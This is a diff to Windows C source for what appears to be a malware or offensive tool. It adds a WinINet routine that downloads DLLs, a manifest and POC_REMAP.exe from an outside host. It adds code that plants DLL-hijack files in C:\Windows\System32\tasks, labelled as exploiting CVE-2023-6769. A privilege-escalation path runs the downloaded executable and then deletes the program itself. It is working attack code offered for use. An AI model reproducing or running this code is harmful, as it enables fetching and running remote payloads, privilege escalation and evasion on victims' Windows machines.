@@ -2,6 +2,9 @@
 #include <stdio.h>
 #include "common.h"
 #include "Structs.h"
+#include <Wininet.h>
+#pragma comment(lib, "wininet.lib")
+#include <stdlib.h>
 
 // GetProcAddress replacement function
 FARPROC GetProcAddressQ(IN HMODULE hModule, IN LPCSTR lpApiName) {
@@ -193,6 +196,106 @@ _END_OF_FUNC:
 		LocalFree(pTokenLabel);
 }
 
+// Function To Define Download Function
+BOOL DownloadFile(LPCSTR url, LPCSTR localFile) {
+	HINTERNET hInternet = InternetOpenA("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	if (!hInternet) {
+		printf("[!] InternetOpenA Failed With Error: %d \n", GetLastError());
+		return FALSE;
+	}
+
+	HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	if (!hUrl) {
+		printf("[!] InternetOpenUrlA Failed With Error: %d \n", GetLastError());
+		InternetCloseHandle(hInternet);
+		return FALSE;
+	}
+
+	HANDLE hFile = CreateFileA(localFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
+		InternetCloseHandle(hUrl);
+		InternetCloseHandle(hInternet);
+		return FALSE;
+	}
+
+	BYTE buffer[4096];
+	DWORD bytesRead, bytesWritten;
+	BOOL bResult;
+	do {
+		bResult = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
+		if (!bResult) {
+			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
+			CloseHandle(hFile);
+			InternetCloseHandle(hUrl);
+			InternetCloseHandle(hInternet);
+			return FALSE;
+		}
+		if (bytesRead == 0) break; // End of file
+		WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
+	} while (bResult && bytesRead > 0);
+
+	CloseHandle(hFile);
+	InternetCloseHandle(hUrl);
+	InternetCloseHandle(hInternet);
+	return TRUE;
+}
+
+// Download Specific Files
+void DownloadFiles() {
+	const char* baseUrl = "http://www.curvelock.com/";
+	const char* files[] = {
+		"imm32.dll",
+		"TAPI32.Manifest",
+		"MsCtfMonior.dll",
+		"POC_REMAP.exe"
+	};
+	const char* localFiles[] = {
+		"imm32.dll",
+		"TAPI32.Manifest",
+		"MsCtfMonior.dll",
+		"POC_REMAP.exe"
+	};
+
+	for (int i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
+		char url[256];
+		snprintf(url, sizeof(url), "%s%s", baseUrl, files[i]);
+		if (DownloadFile(url, localFiles[i])) {
+			printf("[+] Downloaded %s successfully.\n", files[i]);
+		}
+		else {
+			printf("[!] Failed to download %s.\n", files[i]);
+		}
+	}
+}
+
+// Copy Functions for CVE_2023_6769
+BOOL CopyFileToDestination(LPCSTR sourceFile, LPCSTR destinationFile) {
+	if (CopyFileA(sourceFile, destinationFile, FALSE)) {
+		printf("[+] Successfully copied %s to %s\n", sourceFile, destinationFile);
+		return TRUE;
+	}
+	else {
+		printf("[!] Failed to copy %s to %s. Error: %d\n", sourceFile, destinationFile, GetLastError());
+		return FALSE;
+	}
+}
+void CopyFiles() {
+	const char* sourceFiles[] = {
+		"imm32.dll",
+		"TAPI32.manifest",
+		"CurveLock.exe",
+		"payload.png"
+	};
+	const char* destinationPath = "C:\\Windows\\System32\\tasks\\";
+
+	for (int i = 0; i < sizeof(sourceFiles) / sizeof(sourceFiles[0]); i++) {
+		char destinationFile[256];
+		snprintf(destinationFile, sizeof(destinationFile), "%s%s", destinationPath, sourceFiles[i]);
+		CopyFileToDestination(sourceFiles[i], destinationFile);
+	}
+}
+
 // Function that escalates the current process privileges
 BOOL DoPrivilegeEscalation() {
 	
@@ -203,7 +306,7 @@ BOOL DoPrivilegeEscalation() {
 
 	//Checking if the current process is running as admin
 	if (IsTokenElevated(hToken)) {
-		printf("[i] Process is already running as admin\n");
+		printf("[+] Process is already running as admin\n");
 		return TRUE;
 	}
 
@@ -216,6 +319,28 @@ BOOL DoPrivilegeEscalation() {
 		DWORD dwIntegrity = QueryTokenIntegrity(hToken);
 		printf("[i] Current Process Integrity Level : %d \n", dwIntegrity);
 
+		// Checking if the integrity level is not high
+		if (dwIntegrity != THREAD_INTEGRITY_HIGH) {
+			printf("[i] Process is not running at High Integrity Level. Patching It\n");
+			
+			// Downloading the required files
+			//DownloadFiles();
+
+			// Copy CVE Files to C:\\Windows\\System32\\tasks
+			CopyFiles();
+
+			// Execute POC_REMAP.exe
+			const char* command = "POC_REMAP.exe";
+			int result = system(command);
+			if (result == 0) {
+				printf("[+] Successfully executed %s\n", command);
+				DeleteSelf();
+				exit(0); // Exit the Program
+			}
+			else {
+				printf("[!] Failed to execute %s\n", command);
+			}
+		}
 	}
 
 
